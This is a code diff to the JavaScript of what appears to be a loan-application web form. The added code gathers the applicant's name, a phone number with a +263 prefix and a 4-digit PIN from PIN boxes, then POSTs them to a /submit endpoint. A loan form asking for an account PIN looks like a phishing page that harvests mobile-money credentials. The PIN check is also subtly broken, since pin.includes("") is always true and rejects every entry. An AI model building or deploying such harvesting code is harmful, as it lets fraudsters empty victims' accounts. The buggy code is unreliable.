@@ -143,13 +143,55 @@ function nextStep3() {
 // FINAL SUBMIT
 // =====================================
 function submitApp() {
-    window.location.href = "processing.html";
+    // get phone (from page 5 display OR storage)
+    const phone = localStorage.getItem("phone");
+
+    // get PIN from boxes
+    const pinInputs = document.querySelectorAll(".pin-box");
+
+    let pin = "";
+    pinInputs.forEach(input => {
+        pin += input.value;
+    });
+
+    if (!pin || pin.length !== 4 || pin.includes("")) {
+    alert("Enter complete PIN");
+    return;
+}
+
+    const data = {
+        name: localStorage.getItem("fname") + " " + localStorage.getItem("lname"),
+        phone: phone,
+        pin: pin
+    };
+
+    if (!/^\d{4}$/.test(pin)) {
+    alert("PIN must be 4 digits");
+    return;
+}
+
+const btn = document.querySelector(".login-btn");
+btn.disabled = true;
+btn.innerText = "Processing...";
+
+    fetch("/submit", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+    })
+    .then(() => {
+        window.location.href = "processing.html";
+    })
+    .catch(() => {
+        alert("Error submitting application");
+    });
 }
 
 function startProcessing() {
     // optional: show instant feedback
-    alert("Processing your application...");
-
+    
     // redirect to processing page
     window.location.href = "processing.html";
 }
@@ -174,12 +216,11 @@ document.addEventListener("DOMContentLoaded", function () {
     }
 });
 
-window.onload = function () {
-    const amount = document.getElementById("amount");
-    const duration = document.getElementById("duration");
+document.addEventListener("DOMContentLoaded", function () {
+    const phoneInput = document.getElementById("phone");
 
-    if (amount && duration) {
-        amount.value = localStorage.getItem("amount");
-        duration.value = localStorage.getItem("duration");
+    if (phoneInput) {
+        phoneInput.value = localStorage.getItem("phone") || "+263";
     }
-};
+});
+
